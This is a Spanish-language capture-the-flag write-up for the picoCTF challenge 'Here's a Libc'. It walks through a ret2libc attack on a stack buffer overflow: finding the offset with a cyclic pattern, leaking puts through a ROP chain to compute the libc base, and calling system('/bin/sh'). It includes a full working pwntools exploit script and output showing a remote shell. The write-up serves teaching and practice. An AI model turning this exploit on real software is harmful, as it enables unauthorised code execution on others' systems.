---
description: '#Ret2Libc'
---

# Here's a Libc

En este ejercicio se nos presenta un binario, un libc y un makefile.

```c
./vuln_patched         
WeLcOmE To mY EcHo sErVeR!
hola
HoLa
```

En este ejercicio nuestro objetivo es el siguiente:

1. Imprimir la dirección de libc
2. Llamar a system(“/bin/sh“)

El binario tiene una vulnerabilidad en la que no se ha limitado el buffer y podemos sobrescribir valores en el stack.

```c
./vuln_patched
WeLcOmE To mY EcHo sErVeR!
999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999d
zsh: segmentation fault  ./vuln_patched
```

Vamos a encontrar el offset:

```c
cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

RSP  0x7fffffffdc08 ◂— 'raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'

pwndbg> cyclic -l 'raaaaaaa'
Finding cyclic pattern of 8 bytes: b'raaaaaaa' (hex: 0x7261616161616161)
Found at offset 136
```

Vale, ahora que sabemos en que dirección está la dirección de retorno y tenemos control del RIP podemos intentar sacar la dirección base del libc.

Para esto podemos usar `puts` para hacer un leak de la dirección de `puts` y luego en nuestro `solve.py` poder calcular la base de libc:

```c
offset = 136

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_addr = exe.symbols['main']
pop_rdi = 0x00400913 # pop rdi; ret

payload1 = flat({
    offset: [
        pop_rdi,
        puts_got, // Dirección de puts
        puts_plt, // Dirección "cacheada" de puts
        main_addr // Dirección de Retorno
        ]
    })
    
leak = io.recvn(6)  // Hay que imprimirlo de esta forma porque la dirección tiene el byte 0a, que es un \n y la función recvline lo corta
leak = leak.ljust(8, b'\x00')
leak = u64(leak)
info(f'Leak: {hex(leak)}')
```

Con esto el programa nos imprime la dirección de puts en la libc:

```c
[*] Leak: 0x7ffff7880a30
```

Ahora que tenemos la dirección podemos hacerle a saber a pwntools cual es la dirección a la libc:

```python
libc.address = leak - libc.symbols['puts']
```

Ahora que hemos actualizado la dirección podemos hacer el script:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = f'''
b *{exe.plt['puts']}
continue
'''

def conn():
    if args.REMOTE:
        return remote("mercury.picoctf.net", 37289)
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript=gdb_script)
    return r

offset = 136

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
main_addr = exe.symbols['main']
pop_rdi = 0x00400913 # pop rdi; ret
ret = 0x0040052e

def main():

    payload1 = flat({
        offset: [
            pop_rdi,
            puts_got,
            puts_plt,
            main_addr
        ]
    })

    io = conn()
    io.sendlineafter(b'!', payload1)
    leak = io.recvlines(2)
    leak = io.recvn(6)
    leak = leak.ljust(8, b'\x00')
    leak = u64(leak)
    info(f'Leak: {hex(leak)}')
    info(f'Puts plt: {hex(puts_plt)}')
    info(f'Puts got: {hex(puts_got)}')
    
    libc.address = leak - libc.symbols['puts']

    info(f'Base del binario: {hex(libc.address)}')
    bin_sh = next(libc.search(b"/bin/sh"))
    
    payload2 = flat({
        offset: [
            ret,  # El Stack estaba desalineado
            pop_rdi,
            bin_sh,
            libc.symbols['system']
        ]
    })
    
    io.sendlineafter(b'!', payload2)
    io.interactive()

if __name__ == "__main__":
    main()

```

Funciona!

```c
   ~/Desktop/picoCTF/heres_a_libc ❯ python solve.py
[*] '/home/ub1cu0/Desktop/picoCTF/heres_a_libc/vuln_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
[+] Opening connection to mercury.picoctf.net on port 37289: Done
[*] Leak: 0x7f82d1bd6a30
[*] Puts plt: 0x400540
[*] Puts got: 0x601018
[*] Base del binario: 0x7f82d1b56000
[*] Switching to interactive mode

AaAaBaAaCaAaDaAaEaAaFaAaGaAaHaAaIaAaJaAaKaAaLaAaMaAaNaAaOaAaPaAaQaAaRaAaSaAaTaAaUaAaVaAaWaAaXaAaYaAazaabbaabcaabdaabeaabd$  
$ whoami
here-s-a-libc_1
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
```
